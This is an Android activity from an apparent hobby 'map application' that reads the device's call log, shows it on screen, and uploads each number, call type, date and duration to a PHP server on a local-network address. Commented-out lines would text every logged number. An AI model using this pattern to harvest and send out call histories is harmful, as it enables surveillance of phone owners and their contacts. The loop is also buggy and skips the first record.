package com.bhagya.mapapplication;

import android.app.Activity;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.widget.TextView;

import com.androidquery.AQuery;
import com.androidquery.callback.AjaxCallback;
import com.androidquery.callback.AjaxStatus;

import org.json.JSONArray;

import java.util.Date;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class read_calloges extends Activity
{
    AQuery aQuery=new AQuery(this);
    TextView textView = null;


    int callcode;
    String callType ;
    String phNum;
    Date callDate;
    String callTypeCode;
    String strcallDate;
    String callDuration;
    String currElement;
    static boolean ring = false;
    static boolean callReceived = false;


    StringBuffer sb = new StringBuffer();

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_read_calloges);
        textView = (TextView) findViewById(R.id.textview_call);


        SmsManager sms = SmsManager.getDefault();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";

                /* Query the CallLog Content Provider */
        @SuppressWarnings("deprecation")
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, strOrder);

        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);

        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);

        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);

        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        sb.append("Call Log :");
        String uploadurl="http://192.168.43.162/meromobile.com/insert_calloges.php";


        if(managedCursor.moveToFirst()){
        while (managedCursor.moveToNext()){

            String phNum = managedCursor.getString(number);

            String callTypeCode = managedCursor.getString(type);

            String strcallDate = managedCursor.getString(date);

            Date callDate = new Date(Long.valueOf(strcallDate));

            String callDuration = managedCursor.getString(duration);

            String callType = null;

            int callcode = Integer.parseInt(callTypeCode);

            switch (callcode)
            {
                case CallLog.Calls.OUTGOING_TYPE:


                    callType = "Outgoing";



                    //sms.sendTextMessage(phNum, null, "Outgoing msg",  null, null);


                    break;
                case CallLog.Calls.INCOMING_TYPE:

                    callType = "Incoming";
                    //sms.sendTextMessage(phNum, null, "Incoming msg",  null, null);


                    break;
                case CallLog.Calls.MISSED_TYPE:

                    callType = "Missed";
                    //sms.sendTextMessage(phNum, null, "Missed msg",  null, null);

                    break;
            }
            sb.append("\nPhone Number:--- " + phNum + " \nCall Type:--- "
                    + callType + " \nCall Date:--- " + callDate
                    + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");




            Map<String,Object> params = new HashMap<String,Object>();
            params.put("mobile_no",phNum);
            params.put("call_type",callType);
            params.put("date_time",callDate);
            params.put("call_duration",callDuration);

            aQuery.ajax(uploadurl,params, JSONArray.class, new AjaxCallback<JSONArray>() {
                @Override
                public void callback(String url, JSONArray array, AjaxStatus status) {
                    super.callback(url, array, status);

                    // Log.i("response", "REsponser:" + array);
                }
            });

        }


        managedCursor.close();



            textView.setText(sb);

    }}

}